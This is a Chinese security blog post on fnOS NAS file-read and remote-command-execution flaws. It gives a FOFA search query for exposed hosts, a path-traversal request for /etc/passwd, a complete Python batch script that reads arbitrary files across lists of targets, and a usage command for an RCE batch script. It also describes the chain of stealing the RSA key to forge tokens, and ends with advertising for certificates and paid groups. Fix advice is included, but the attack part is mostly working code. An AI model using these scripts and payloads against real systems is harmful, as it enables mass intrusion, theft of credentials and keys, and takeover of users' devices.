#  飞牛私有云fnOS远程命令执行漏洞与文件读取漏洞【批量验证脚本】  
原创 MY0723
                    MY0723  不秃头的安全   2026-02-05 09:34  
  
# 飞牛私有云fnOS远程命令执行漏洞与文件读取漏洞【批量验证脚本】  
```
前言：本文中涉及到的相关技术或工具仅限技术研究与讨论，严禁用于非法用途，否则产生的一切后果自行承担，如有侵权请私聊删除。知识星球和交流群在最下方。需要cn*d（中高）/c2n*d（高与支撑单位）/安全证书请联系vx咨询
```  
  
  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/I2dhkmhKrSY2rfvtV5M84hAjZH9ayqvLmlVB11bibv4Qud0JogDCVB0VqmdciaVXwuic63mdumuR2yEdTPL1IK5U1k8Ze7OSoWbiaVmiaJjkegfc/640?wx_fmt=jpeg "")  
  
飞牛私有云fnOS是一款基于Debian Linux内核深度开发的国产、正版免费NAS操作系统。因其免费和程序资源丰富，吸引了很多的用户。  
  
近日，飞牛私有云fnOS系统被曝出高危远程命令执行漏洞与文件读取漏洞，攻击者可通过精心构造的请求直接获取系统权限并读取敏感文件，危害极大。可通过脚本自查环境是否存在漏洞~  
### 1.🎯 漏洞描述  
  
飞牛系统（fnOS）fnOS出现严重0day漏洞，未经身份攻击者可通过该漏洞在服务器端任意文件读取以及任意执行代码，写入后门后，可造成rce，进而控制服务器。  
### 2. ✨ 受影响范围  
```
fnos<1.1.15
```  
  
**fofa语句：**  
```
icon_hash="470295793" || app="飞牛-私有云fnOS"
```  
### 2.🛰️ 漏洞详情  
  
任意文件读取：该漏洞源于app-center-static  
接口（用于提供应用静态资源）在处理参数时，仅做简单字符串拼接，未对路径跳转符进行严格校验。攻击者可以利用../  
等路径遍历符，构造恶意URL，从而访问到app-center-static  
目录以外的任意文件  
  
**示例请求：**  
```
GET [TARGET_IP]:5666/app-center-static/serviceicon/myapp/%7B0%7D/?size=../../../../etc/passwd
```  
  
通过上述请求，攻击者可以读取到/etc/passwd  
文件。类似地，可以读取其他敏感文件，例如/etc/shadow  
、/var/lib/postgresql/*/main/base  
下的数据库文件，甚至RSA私钥文件rsa_private_key.pem  
，为后续的认证绕过和命令执行提供条件  
  
飞牛OS的RCE漏洞链通常包括以下几个关键步骤 :  
1. **任意文件读取：**  
 攻击者首先利用文件读取漏洞获取系统中的敏感文件，其中最关键的是rsa_private_key.pem  
。该私钥在后续的Token生成和认证过程中扮演核心角色。  
  
1. **认证绕过：**  
  
1. **登录逻辑与Token生成：**  
 飞牛OS的认证依赖于secret  
和token  
。secret  
是一个16字节的随机数据，其中第16字节被强制设置为o  
。token  
是一个32字节的数据，其前16字节是IV（由时间戳、计时器和随机数拼接而成），后16字节是使用RSA密钥对secret  
进行AES加密后的数据。这意味着secret  
和token  
可以相互转化。  
  
1. **鉴权机制：**  
 在/usr/trim/bin/trim  
的handle_websocket_packet  
函数中，存在鉴权逻辑。当系统进行签名验证时，如果请求中包含token  
字段，系统会直接解密该token  
以获取secret  
，然后使用此secret  
对请求体进行签名验证。攻击者正是利用这一机制，通过获取到的rsa_private_key.pem  
伪造有效的secret  
和token  
，从而绕过认证。  
  
1. **授权命令执行：**  
 成功绕过认证后，攻击者获得了合法用户的权限。此时，可以利用系统中的其他业务逻辑漏洞实现命令执行。例如，/usr/trim/bin/trim_http_cgi  
中存在一个CGI路径穿越漏洞。攻击者可以结合伪造的合法token和文件上传API，将恶意bash脚本上传到/var  
目录并执行，从而实现远程命令执行。  
  
**总结而言，该RCE漏洞链的核心在于：**  
 攻击者通过任意文件读取获取RSA私钥 -> 利用私钥伪造Token绕过认证 -> 结合CGI路径穿越漏洞执行任意命令。  
### 3. 🔐POC及脚本  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/I2dhkmhKrSbgk0UibvApfV4voTHUfxP9VCCibQZh40flNibqhKbzUeNWlficVriahPG3QDuYmwN8c6FYm6ZZZL2MvsoMzoVfQU0Imek5KBIo1le0/640?wx_fmt=png&from=appmsg "")  
#### 🛰️任意文件读取POC:  
```
/app-center-static/serviceicon/myapp/%7B0%7D/?size=../../../..//app-center-static/serviceicon/myapp/%7B0%7D/?size=../../../../etc/passwd
```  
  
**任意文件读取批量脚本**  
```
import requestsimport argparseimport sysdef exploit_lfi(target_ip, target_port, file_to_read):    """    Exploits the fnOS arbitrary file read vulnerability for a single target.    """    # 确保 target_ip 不包含协议前缀    target_ip = target_ip.replace("http://", "").replace("https://", "").rstrip("/")    base_url = f"http://{target_ip}:{target_port}"        # 规范化待读取文件路径    if not file_to_read.startswith("/"):        file_to_read = "/" + file_to_read    # 构造路径穿越 Payload    # 从 /app-center-static/serviceicon/myapp/%7B0%7D/ 向上跳 4 级到达根目录    traversal_payload = "../../../../" + file_to_read.lstrip("/")        url = f"{base_url}/app-center-static/serviceicon/myapp/%7B0%7D/?size={traversal_payload}"        print(f"\n[*] Target: {target_ip}:{target_port}")    print(f"[*] Attempting to read: {file_to_read}")    print(f"[*] Requesting URL: {url}")    try:        response = requests.get(url, timeout=10)        if response.status_code == 200:            print("[+] File content successfully retrieved:")            print("=" * 50)            print(response.text)            print("=" * 50)        else:            print(f"[-] Failed to retrieve file. Status code: {response.status_code}")    except requests.exceptions.RequestException as e:        print(f"[-] An error occurred: {e}")def main():    parser = argparse.ArgumentParser(description='fnOS Arbitrary File Read (LFI) PoC Script')        # 目标指定组（互斥）    target_group = parser.add_mutually_exclusive_group(required=True)    target_group.add_argument("-t", "--target", help='Target IP address or hostname (e.g., 192.168.1.123)')    target_group.add_argument("-tf", "--target-file", help='File containing a list of targets (IP:Port or IP per line)')        parser.add_argument("-p", "--port", type=int, default=5666, help='Default target port (default: 5666)')    parser.add_argument("-f", "--file", required=True, help='Path to the file to read on the target system (e.g., /etc/passwd)')        args = parser.parse_args()        if args.target_file:        try:            with open(args.target_file, 'r') as f:                targets = f.readlines()                        for target_entry in targets:                target_entry = target_entry.strip()                if not target_entry:                    continue                                ip = target_entry                port = args.port                                if":"in target_entry:                    parts = target_entry.split(":")                    # 处理可能带有 http:// 的情况                    if len(parts) > 2: # http://1.1.1.1:5666                        ip = ":".join(parts[:-1])                        port_str = parts[-1]                    else: # 1.1.1.1:5666                        ip, port_str = parts                                            try:                        port = int(port_str)                    except ValueError:                        pass # 使用默认端口                                exploit_lfi(ip, port, args.file)        except FileNotFoundError:            print(f"[-] Target file not found: {args.target_file}")            sys.exit(1)    else:        exploit_lfi(args.target, args.port, args.file)if __name__ == '__main__':    main()
```  
  
命令样式  
```
包含多个目标，请使用 -tf 参数：python fnos_lfi_poc.py -tf urls.txt -f /etc/passwd测试单个目标:python fnos_lfi_poc.py -t 192.168.1.123 -f /etc/passwd
```  
  
不想环境搭建的直接启动mht无镜靶场，配置好openvpn配置文件  
  
![](https://mmbiz.qpic.cn/mmbiz_png/I2dhkmhKrSbjqsiaqCD6QIa0wvJymVlcEibApltJOsaCFDTRsnQxrpL2N2MRXXFmPqwpAZYcX7eM5icl38ElP72S60Ns09fPDRXsozRH1CkpSI/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/I2dhkmhKrSbiaad4qKjJOMIibHRvHVCXHKkdS5SdQYrWjAXTGWLZIqy8LXiaUq3HJ0ciaFmWfRoSdERJInAIiaXXtmCfRGReE3dpzRqKoZMib5yrA/640?wx_fmt=png&from=appmsg "")  
获取无镜靶场flag  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/I2dhkmhKrSZNnb7yDiaSWDxNP09sY7KEeFQaYxIo5o2mayOt2Ey3dxXibxh9etibibTXlGKuibviccCI1n1vmmjRMmTBicUkE7BdzKrK1MhafPwZ1c/640?wx_fmt=png&from=appmsg "")  
  
成功提交  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/I2dhkmhKrSYuwicO4MGOxfv1ibxu6tJClrvcjnib2eesSnZyTt29ibVibjbXicwoVTic7JEYRiaSzzzL0f4DqicoXpJBwUCXHSZR13fQH5icvb0fQFT9g/640?wx_fmt=png&from=appmsg "")  
#### 🌐命令执行批量扫描脚本：  
  
本脚本基于githubbron1e  
 作者fnos-rce-chain   
修改下可造成rce效果~脚本获取方式在下面  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/I2dhkmhKrSbVnQRRSKPHZnI4kKS7EIOiagIOcBfIod0G6DiaVCxTpP4ELMwp3Y6U5J08umBVXWX8H7ibDzjxsu3TQgANTRnYgXUs9BKODCpmibU/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/I2dhkmhKrSaJBVEEcFshGiaH3clgnKPkavHVl4ibBBWI3HMTHnr4dcJzTd2v7AOwGG8eJRFyM2orl6N7SIkwVGEIibwpLa4GacjhspDCBJxQj0/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/I2dhkmhKrSZIV0by1t2j9wstXu6jtAyNwPxibs7Fp2MnicMmfQiblia73ia5JDxzG0uLVNFB5g5hwTZ3tZ6Te0GZkURETicxqNSw7ABPY2ZvbvBFg/640?wx_fmt=png&from=appmsg "")  
  
直接执行命令  
```
python fnos_rce.py -f urls.txt
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/I2dhkmhKrSZH6zNlAYSY1UUePOgT3mXLWDM6ibBdHI5sYobBkJnOUoCphQrD7S58jT3KmVRHSiaKgz7uicW8jicLQbyLicVUoG57FlMvyrias75lI/640?wx_fmt=png&from=appmsg "")  
  
访问利用成功  
```
http://192.168.111.20:5666/app-center-static/serviceicon/myapp/%7B0%7D/?size=../../../../tmp/QAXNB.txt
```  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/I2dhkmhKrSbhuov1nPmk8d5VDppYhzKzriaxqntWiaMn07Ckry01TMiceBLeiaEtdDibicZr0GqicnG7TGM1zM7LX5BTHg98EVTIubJkhbsnFQcGWc/640?wx_fmt=png&from=appmsg "")  
### 4. 📑修复建议  
- **升级系统：**  
 确保飞牛OS系统升级到已修复漏洞的最新版本。  
  
- **代码审计：**  
 对app-center-static  
接口和trim_http_cgi  
等关键模块进行严格的代码审计 ，确保所有用户输入都经过严格的过滤和校验，防止路径遍历和命令注入。  
  
- **最小权限原则：**  
 运行服务时遵循最小权限原则，限制不必要的权限，即使发生漏洞，也能降低攻击面和危害。  
  
- **Web应用防火墙 (WAF)：**  
 部署WAF可以有效检测和拦截针对路径遍历和命令注入的攻击。  
  
### 5. 🔄 脚本获取  
  
关注公众号回复"  
20260205"即可获取完整RCE PY脚本链接  
### 6. 📄往期推荐：  
  
### 攻防实战 | 入口即突破口：通过公众号名称获取54家单位数据库防线GNU Inetutils telnet远程认证绕过漏洞（CVE-2026-24061）分析及自查脚本ShiroExploit_通过另类手法实现Shiro一把梭渗透测试 | fuzz参数拿下网站管理员权限  
  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/DicRqXXQJ6fXP2x6ewTKdjJKM490mEDMSibIYHagUqjv7yswslDBgia81mQ1YrpPZJ7rVBMfsxm2jpgplm8Zl5hbQ/640?wx_fmt=other&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=18 "")  
  
**关于我们:**  
  
感谢各位大佬们关注-不秃头的安全，后续会坚持更新渗透漏洞思路分享、安全测试、好用工具分享以及挖掘SRC思路等文章，同时会组织不定期抽奖，希望能得到各位的关注与支持，考证请加联系vx咨询。  
  
  
## 1. 需要以下各类安全证书的可以联系，后期可能涨价~  
  
①Cn*d  
，NCC，NVDB🀄️高漏洞证书  
  
②CNNVD中高\漏洞情报\ 一二三级支撑单位均可协助获得  
  
③CISP、PTE/PTS、CISP-DSG、IRE/IRS、NISP一二级、PMP、CCSK、CISSP/CCSP、CISAW各种类、CCRC\CCSC、itil、软考中高级、CDSP各种类、CISA，oscp等等巨优惠。ISO27001、ITss服务项目经理报名等下证即可，证书组团报更便宜，可对公，可开专普票。想加群下方链接，群过期或群满加下方vx拉：  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_jpg/DicRqXXQJ6fXP2x6ewTKdjJKM490mEDMSMxOByoCubVn1O2XXzI4ibhkAj4iaHnCSia1hfUPnPPY7ibmmLMhEMicUG0w/640?wx_fmt=jpeg&from=appmsg&watermark=1&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=17 "")  
  
  
2. 需要入星球的可以私聊优惠？  
```
1、维护更新src、cnxd、cnnxd专项漏洞知识库，包含原理、挖掘技巧、实战案例2、fafo/零零信安 高级会员key3、最新POC通用报告详情分享思路4、知识星球专属微信“内部圈子交流群”5、攻防演练资源分享（免杀、溯源、钓鱼等）6、新鲜工具分享7、不定期有工作招聘内推（工作/护网内推）8、19个专栏会持续更新~提前续费有优惠，好用不贵很实惠
```  
  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_jpg/DicRqXXQJ6fXP2x6ewTKdjJKM490mEDMS7Lqfias313c3nQNusmPibywGfibibNrIjwXZYVKO2TggXOzU7LSbkktX9w/640?wx_fmt=other&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=25 "")  
## 3、其他合作（合法合规）  
  
1、承接红蓝攻防、渗透、安全意识培训、基线核查及加固、应急响应、重保防守、代码审计等安全项目（须授权），需要攻防团队或岗位招聘都可代发、代招（灰黑勿扰）；  
  
2、各位安全老板需要文章推广的请私聊，承接合法合规推广文章发布，可直发、可按产品编辑推广；  
合作、推广代发、安全项目、岗位代招均可发布；  
  
3、接受脱敏投稿,送一年知识星球及礼包。  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_jpg/DicRqXXQJ6fXP2x6ewTKdjJKM490mEDMSnGqLZicLTOuMKvu20UToibKKKst0YNz0mXczYnrDCiaDEFhYB5Mht0Fxw/640?wx_fmt=other&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=23 "")  
  
  
